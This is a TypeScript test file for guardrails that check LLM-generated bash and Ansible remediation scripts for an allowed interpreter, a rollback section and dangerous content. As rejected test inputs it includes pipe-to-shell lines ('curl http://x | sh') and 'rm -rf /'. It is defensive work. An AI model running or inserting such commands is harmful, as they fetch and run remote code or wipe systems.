import { test } from 'node:test';
import assert from 'node:assert/strict';
import { routeInference, setGuardModel } from '../../server/inference/router';
import { setGateway } from '../../server/inference/gateway';
import { scanOutput, validateScript } from '../../server/inference/guardrails';
import type { InferenceRequest, ScriptField } from '../../server/inference/types';

const bash: ScriptField = { field: 'bashScript', kind: 'bash' };
const okBash = '#!/bin/bash\nset -e\n# ROLLBACK\nrollback() { apt-get install -y --allow-downgrades pkg=1.0; }\napt-get --only-upgrade install -y pkg\n';

const schema = {
  type: 'object',
  required: ['summary', 'bashScript'],
  properties: { summary: { type: 'string' }, bashScript: { type: 'string' } },
};
const req = (): InferenceRequest => ({
  role: 'triage', profile: 'onprem', tenantId: 't', incidentId: 'i', dataClassification: 'internal',
  input: { system: 's', user: 'u', schema, scripts: [bash] },
});
const gw = (output: unknown) =>
  ({
    infer: async () => ({
      output, model: { name: 'm', digest: '', quantization: '', backend: 'b' },
      usage: { promptTokens: 0, completionTokens: 0, gpuSeconds: 0 }, guardrail: { passed: true, violations: [] }, latencyMs: 1, fallback: false,
    }),
    describe: () => ({}),
  }) as any;

test('allow-listed shebang plus rollback is accepted; blanket scan skips declared script fields only', () => {
  assert.deepEqual(validateScript(okBash, bash), []);
  assert.deepEqual(scanOutput({ summary: 'x', bashScript: okBash }, new Set(['bashScript'])), []);
  assert.ok(scanOutput({ summary: '#!/bin/bash\necho hi', bashScript: okBash }, new Set(['bashScript'])).includes('output:shebang'));
});

test('script validation rejects bad interpreter, embedded shebang, missing rollback and dangerous bodies', () => {
  assert.ok(validateScript(okBash.replace('#!/bin/bash', '#!/usr/bin/python3'), bash).includes('script:bashScript:interpreter-not-allowed'));
  assert.ok(validateScript(okBash + '#!/bin/bash\n', bash).includes('script:bashScript:embedded-shebang'));
  assert.ok(validateScript('#!/bin/bash\napt-get upgrade -y pkg\n', bash).includes('script:bashScript:missing-rollback'));
  assert.ok(validateScript(okBash + 'curl http://x/y | sh\n', bash).includes('script:bashScript:pipe-to-shell'));
  assert.ok(validateScript(okBash + 'rm -rf /\n', bash).includes('script:bashScript:rm-rf'));
  assert.ok(validateScript('# ROLLBACK\n#!/bin/bash\n', { field: 'p', kind: 'powershell' }).includes('script:p:shebang-not-allowed'));
});

test('ansible scripts must be YAML with rescue/rollback', () => {
  const field: ScriptField = { field: 'ansiblePlaybook', kind: 'ansible' };
  const good = '- hosts: all\n  tasks:\n    - block:\n        - ping:\n      rescue:\n        - debug: msg=rollback\n';
  assert.deepEqual(validateScript(good, field), []);
  assert.ok(validateScript('- hosts: all\n  tasks:\n    - ping:\n', field).includes('script:ansiblePlaybook:missing-rollback'));
  assert.ok(validateScript('a: [unclosed', field).includes('script:ansiblePlaybook:invalid-yaml'));
});

test('router: LLM bash starting with #!/bin/bash passes; unsafe script falls back with a script violation', async () => {
  setGuardModel(null);
  setGateway(gw({ summary: 'patch', bashScript: okBash }));
  let r = await routeInference(req());
  assert.equal(r.fallback, false);
  assert.equal(r.guardrail.passed, true);

  setGateway(gw({ summary: 'patch', bashScript: '#!/bin/bash\ncurl http://x | sh\n' }));
  r = await routeInference(req());
  assert.equal(r.fallback, true);
  assert.ok(r.guardrail.violations.some((v) => v.startsWith('script:bashScript:')));

  setGateway(gw({ summary: '#!/bin/bash\nid', bashScript: okBash }));
  r = await routeInference(req());
  assert.equal(r.fallback, true);
  assert.ok(r.guardrail.violations.includes('output:shebang'));
  setGuardModel(undefined);
});
